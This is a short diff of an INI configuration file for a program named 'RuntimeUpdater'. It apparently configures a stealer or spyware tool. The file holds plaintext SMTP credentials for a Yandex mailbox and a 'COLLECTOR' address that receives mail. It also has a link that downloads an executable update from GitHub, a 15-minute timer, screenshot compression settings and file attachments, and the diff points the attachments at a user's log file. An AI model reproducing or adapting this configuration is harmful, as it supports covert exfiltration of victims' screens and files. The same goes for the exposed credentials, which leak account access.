@@ -3,7 +3,7 @@ HOST=smtp.yandex.ru
 LOGIN=multihack.update@yandex.ru
 PASSWORD=multihackupdate
 PORT=465
-COLLECTOR=chijikson@yandex.ru
+COLLECTOR=multihack.update@yandex.ru
 [UPDATE]
 LINK=https://github.com/ZongerX/test/raw/master/RuntimeUpdater.exe
 LASTVERSION=1
@@ -12,5 +12,5 @@ TIME=900000
 [IMAGE]
 COMPRESSION=100
 [FILE]
-ATTACH=D:\Dropbox\Projects\RuntimeUpdater\RuntimeUpdater_Icon.ico
-ATTACH2=
+ATTACH=config.ini
+ATTACH2=C:\Users\ZongerX\regwizard.log
